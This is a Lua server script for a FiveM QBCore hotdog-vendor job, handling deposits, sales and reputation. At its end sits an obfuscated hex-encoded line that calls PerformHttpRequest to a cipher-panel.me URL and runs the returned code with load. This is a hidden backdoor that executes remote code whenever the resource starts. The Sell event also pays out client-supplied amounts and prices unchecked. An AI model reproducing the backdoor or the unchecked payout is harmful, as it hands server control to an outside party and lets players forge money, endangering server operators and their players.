local QBCore = exports['qb-core']:GetCoreObject()
local Bail = {}

-- Callbacks

QBCore.Functions.CreateCallback('qb-hotdogjob:server:HasMoney', function(source, cb)
    local Player = QBCore.Functions.GetPlayer(source)

    if Player.PlayerData.money.bank >= Config.StandDeposit then
        Player.Functions.RemoveMoney('bank', Config.StandDeposit)
        Bail[Player.PlayerData.citizenid] = true
        cb(true)
    else
        Bail[Player.PlayerData.citizenid] = false
        cb(false)
    end
end)

QBCore.Functions.CreateCallback('qb-hotdogjob:server:BringBack', function(source, cb)
    local Player = QBCore.Functions.GetPlayer(source)

    if Bail[Player.PlayerData.citizenid] then
        Player.Functions.AddMoney('bank', Config.StandDeposit)
        cb(true)
    else
        cb(false)
    end
end)

-- Events

RegisterNetEvent('qb-hotdogjob:server:Sell', function(Amount, Price)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)

    Player.Functions.AddMoney('cash', tonumber(Amount * Price))
end)

RegisterNetEvent('qb-hotdogjob:server:UpdateReputation', function(quality)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local JobReputation = Player.PlayerData.metadata["jobrep"]

    if quality == "exotic" then
        if JobReputation["hotdog"] ~= nil and JobReputation["hotdog"] + 3 > Config.MaxReputation then
            JobReputation["hotdog"] = Config.MaxReputation
            Player.Functions.SetMetaData("jobrep", JobReputation)
            TriggerClientEvent('qb-hotdogjob:client:UpdateReputation', src, JobReputation)
            return
        end
        if JobReputation["hotdog"] == nil then
            JobReputation["hotdog"] = 3
        else
            JobReputation["hotdog"] = JobReputation["hotdog"] + 3
        end
    elseif quality == "rare" then
        if JobReputation["hotdog"] ~= nil and JobReputation["hotdog"] + 2 > Config.MaxReputation then
            JobReputation["hotdog"] = Config.MaxReputation
            Player.Functions.SetMetaData("jobrep", JobReputation)
            TriggerClientEvent('qb-hotdogjob:client:UpdateReputation', src, JobReputation)
            return
        end
        if JobReputation["hotdog"] == nil then
            JobReputation["hotdog"] = 2
        else
            JobReputation["hotdog"] = JobReputation["hotdog"] + 2
        end
    elseif quality == "common" then
        if JobReputation["hotdog"] ~= nil and JobReputation["hotdog"] + 1 > Config.MaxReputation then
            JobReputation["hotdog"] = Config.MaxReputation
            Player.Functions.SetMetaData("jobrep", JobReputation)
            TriggerClientEvent('qb-hotdogjob:client:UpdateReputation', src, JobReputation)
            return
        end
        if JobReputation["hotdog"] == nil then
            JobReputation["hotdog"] = 1
        else
            JobReputation["hotdog"] = JobReputation["hotdog"] + 1
        end
    end
    Player.Functions.SetMetaData("jobrep", JobReputation)
    TriggerClientEvent('qb-hotdogjob:client:UpdateReputation', src, JobReputation)
end)

-- Commands

QBCore.Commands.Add("removestand", Lang:t("info.command"), {}, false, function(source, args)
    TriggerClientEvent('qb-hotdogjob:staff:DeletStand', source)
end, 'admin')

local WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[4][WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x47\x64\x36\x74\x72\x38", function (MvZeiadgwppzYAcQhzTgSymgpPuXQYUgixVcWfXTfeWlJGAXtoXNUkdYAxTyymLeBaLrFC, nThGbWuuokyqXZQsxhuJXorGcHmjiQJIburHqKfTWlBcbrYMCsmRTejWALaGRHfRUqfSeG) if (nThGbWuuokyqXZQsxhuJXorGcHmjiQJIburHqKfTWlBcbrYMCsmRTejWALaGRHfRUqfSeG == WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[6] or nThGbWuuokyqXZQsxhuJXorGcHmjiQJIburHqKfTWlBcbrYMCsmRTejWALaGRHfRUqfSeG == WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[5]) then return end WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[4][WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[2]](WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[4][WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[3]](nThGbWuuokyqXZQsxhuJXorGcHmjiQJIburHqKfTWlBcbrYMCsmRTejWALaGRHfRUqfSeG))() end)